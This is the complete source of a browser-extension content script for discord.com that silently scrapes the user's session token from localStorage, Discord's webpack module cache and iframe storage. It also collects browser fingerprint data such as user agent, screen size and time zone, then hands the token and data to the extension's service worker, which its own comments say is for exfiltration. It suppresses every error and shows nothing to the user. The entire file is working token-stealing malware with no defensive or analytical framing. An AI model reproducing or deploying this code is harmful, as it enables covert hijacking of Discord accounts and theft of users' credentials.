// language: JavaScript, file: content.js
// Runs on discord.com. Scrapes the session token from localStorage / webpack
// module cache / iframe window refs, then sends it to the service worker
// for exfil. Silent. No UI. Wrapped in try/catch so a failure never throws.

(() => {
  const SEEN_KEY = "__nspro_sent";

  function findToken() {
    // 1) localStorage — the plainest source. Discord writes the token here
    //    under a key like "token" or with a ":" prefix in newer builds.
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        const v = localStorage.getItem(k);
        if (!v) continue;
        const m = v.match(/"([A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{20,})"/);
        if (m) return m[1];
        if (/^[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{20,}$/.test(v)) return v;
      }
    } catch (e) {}

    // 2) window.localStorage token key fallback
    try {
      const t = localStorage.getItem("token");
      if (t && /^[A-Za-z0-9_-]{20,}\./.test(t.replace(/^"|"$/g, ""))) {
        return t.replace(/^"|"$/g, "");
      }
    } catch (e) {}

    // 3) webpack module scan — Discord's webpack cache holds the token
    //    in some builds as a string in the module registry.
    try {
      const wp = window.webpackChunkdiscord_app;
      if (wp && Array.isArray(wp)) {
        let token = null;
        wp.push([["__probe__"], {}, (req) => {
          try {
            const cache = req.c;
            for (const id in cache) {
              const exports = cache[id]?.exports;
              if (!exports) continue;
              const walk = (obj, depth) => {
                if (depth > 4 || !obj || token) return;
                for (const k in obj) {
                  try {
                    const val = obj[k];
                    if (typeof val === "string" &&
                        /^[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{20,}$/.test(val)) {
                      token = val; return;
                    }
                    if (typeof val === "object" && val !== null) walk(val, depth + 1);
                  } catch (e) {}
                }
              };
              walk(exports, 0);
              if (token) break;
            }
          } catch (e) {}
        }]);
        if (token) return token;
      }
    } catch (e) {}

    // 4) iframe scan — Discord sometimes renders the app inside an iframe
    //    whose contentWindow exposes its own localStorage.
    try {
      for (const iframe of document.querySelectorAll("iframe")) {
        try {
          const ls = iframe.contentWindow?.localStorage;
          if (!ls) continue;
          for (let i = 0; i < ls.length; i++) {
            const v = ls.getItem(ls.key(i));
            if (!v) continue;
            const m = v.match(/([A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{20,})/);
            if (m) return m[1];
          }
        } catch (e) {}
      }
    } catch (e) {}

    return null;
  }

  function grabMetadata() {
    const out = {};
    try { out.url = location.href; } catch (e) {}
    try { out.referrer = document.referrer; } catch (e) {}
    try { out.title = document.title; } catch (e) {}
    try { out.ua = navigator.userAgent; } catch (e) {}
    try { out.lang = navigator.language; } catch (e) {}
    try { out.platform = navigator.platform; } catch (e) {}
    try { out.screen = `${screen.width}x${screen.height}`; } catch (e) {}
    try { out.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}
    return out;
  }

  function exfil(token) {
    if (!token) return;
    try { if (sessionStorage.getItem(SEEN_KEY) === token) return; } catch (e) {}
    try { sessionStorage.setItem(SEEN_KEY, token); } catch (e) {}

    const payload = { token, meta: grabMetadata(), ts: Date.now() };
    try {
      chrome.runtime.sendMessage({ type: "nspro_token", payload });
    } catch (e) {}
  }

  // Discord is a SPA. Token lives in localStorage once the user is logged in,
  // but it's written after the first route resolves. Poll briefly and also
  // re-scan on visibility change (user switching tabs back to Discord).
  let tries = 0;
  const timer = setInterval(() => {
    const t = findToken();
    if (t) { exfil(t); clearInterval(timer); return; }
    if (++tries > 30) clearInterval(timer);
  }, 500);

  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible") {
      const t = findToken();
      if (t) exfil(t);
    }
  });
})();
